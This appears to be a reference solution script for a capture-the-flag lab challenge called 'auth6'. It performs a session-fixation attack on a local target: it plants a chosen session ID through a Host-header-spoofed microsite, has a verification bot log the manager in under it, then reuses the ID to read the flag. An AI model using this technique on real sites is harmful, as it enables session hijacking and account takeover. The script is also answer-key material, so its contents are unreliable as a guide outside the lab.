#!/usr/bin/env python3
"""Reference exploit for auth6 (Brightleaf).

Plants a chosen sid via the marketing microsite (reached by Host header --
see README's lab-simplification note), confirms it's not yet valid on the
real app, has the registrar's verification bot sign the manager in under
it, then reuses the same sid against the real app's dashboard.
"""
import os
import re
import secrets
import sys
import time
from urllib.parse import urlparse

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("BASE", "http://127.0.0.1:8065")
HOST = urlparse(BASE).hostname


def wait_up(s: requests.Session) -> None:
    for _ in range(30):
        try:
            s.get(BASE, timeout=2)
            return
        except requests.RequestException:
            time.sleep(1)


def main() -> int:
    s = requests.Session()
    wait_up(s)

    my_sid = secrets.token_hex(16)

    # Plant the chosen sid via the marketing microsite (different Host).
    r = s.post(f"{BASE}/plant", data={"sid": my_sid}, timeout=5,
               headers={"Host": f"marketing.{HOST}"})
    if r.status_code != 200:
        sys.stderr.write("could not plant sid via the marketing microsite\n")
        return 1

    # Pre-exploit: the planted-but-unauthenticated sid must NOT reach the flag.
    r = s.get(f"{BASE}/dashboard", timeout=5, cookies={"sid": my_sid}, allow_redirects=False)
    if r.status_code == 200 and "flag{" in r.text:
        sys.stderr.write("precondition failed: dashboard reachable before fixation\n")
        return 1

    # Fixate: the verification bot signs the manager in under our sid.
    s.post(f"{BASE}/helpdesk/verify-link", data={"sid": my_sid}, timeout=5)

    # Reuse the same sid on the real app.
    r = s.get(f"{BASE}/dashboard", timeout=5, cookies={"sid": my_sid})
    m = re.search(r"flag\{[^}]+\}", r.text)
    if m:
        print(m.group(0))
        return 0

    sys.stderr.write("no flag found\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
